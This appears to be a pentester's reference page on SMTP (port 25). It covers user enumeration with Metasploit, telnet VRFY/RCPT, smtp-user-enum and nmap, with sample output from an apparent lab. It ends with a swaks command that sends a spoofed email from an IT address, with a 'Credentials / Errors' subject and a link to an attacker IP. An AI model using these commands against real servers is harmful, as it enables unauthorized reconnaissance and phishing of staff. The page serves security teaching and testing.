---
description: >-
  The Simple Mail Transfer Protocol is a communication protocol for electronic
  mail transmission.
---

# 25 - SMTP

## SMTP User Enumeration Utility&#x20;

Allows the enumeration of users: VRFY (confirming the names of valid users) and EXPN (which reveals the actual address of users aliases and lists of e-mail (mailing lists)). Through the implementation of these SMTP commands can reveal a list of valid users. User files contains only Unix usernames so it skips the Microsoft based Email SMTP Server. This can be changed using UNIXONLY option and custom user list can also be provided.&#x20;

**Metasploit:**&#x20;

```
use auxiliary/scanner/smtp/smtp_enum
```

### Manual Enumeration

You can guess for valid user account through the following command and if you receive response code 550 it means unknown user account:

telnet into the host:

```
telnet 192.168.0.1 25
```

Using vrfy:&#x20;

```
vrfy raj@mail.lab.ignite
```

Using rcpt:

```
RCPT TO:root 
```

If you received a message code 250,251,252 which means the server has accepted the request and user account is valid.&#x20;

### smtp-user-enum (builtin in Kali)&#x20;

if not installed just run

```
apt install smtp-user-enum
```

Simple run:

```
smtp-user-enum -M VRFY -U users.txt -t 10.0.0.1
```

Adding domain (will add the domain after the user):

```
root@kali# smtp-user-enum -U users.txt -D humongousretail.com -t 10.13.38.12 -m 50 -M RCPT
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 50
Usernames file ........... /usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt
Target count ............. 1
Username count ........... 21168
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ humongousretail.com

######## Scan started at Sat May 11 10:59:18 2019 #########
10.13.38.12: it@humongousretail.com exists
10.13.38.12: legal@humongousretail.com exists
10.13.38.12: marketing@humongousretail.com exists
10.13.38.12: sales@humongousretail.com exists
######## Scan completed at Sat May 11 11:06:51 2019 #########
4 results.

21168 queries in 453 seconds (46.7 queries / sec)
```

Credit: [https://0xdf.gitlab.io/2020/06/17/endgame-xen.html](https://0xdf.gitlab.io/2020/06/17/endgame-xen.html)

### Nmap

```
nmap –script smtp-enum-users.nse 172.16.212.133
```

## Send Email

### Swaks

Kali has a built in Perl script that can be used to send emails - Swaks - Swiss Army Knife for SMTP.

Example:

```
swaks --to sales@FAKEDOMAIN.com --from it@FAKEDOMAIN.com --header "Subject: Credentials / Errors" --body "test http://10.14.15.41/" --server FAKEDOMAIN.com
```

